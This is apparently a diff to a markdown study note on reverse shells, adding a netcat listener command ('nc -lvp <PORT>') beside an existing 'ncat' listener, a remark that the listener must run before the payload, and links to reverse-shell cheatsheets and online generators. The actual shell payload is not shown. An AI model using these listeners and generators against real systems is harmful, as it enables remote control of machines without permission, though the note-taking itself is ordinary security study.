@@ -8,7 +8,11 @@ listener example
 ```bash
 ncat -l -p 1337
 ```
-This listens to the TCP port 1337 for ip like 10.10.17.1
+```
+nc -lvp <PORT>
+```
+This listens to the TCP port 1337 for ip like 10.10.17.1   
+This needs to be set before the payload is executed
 ## Bash is simplest way to connect
 bash reverse shell example
 ```bash
@@ -24,6 +28,11 @@ bash reverse shell example
 ## There are countless resources
 ### Cheatsheet for reverse shell
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+### Online reverse shell generators
+- https://www.revshells.com/
+- https://weibell.github.io/reverse-shell-generator/
+
 
 ## Real world examples
 1. BrokenSesame vulberability in alibaba PostGreSQl databases
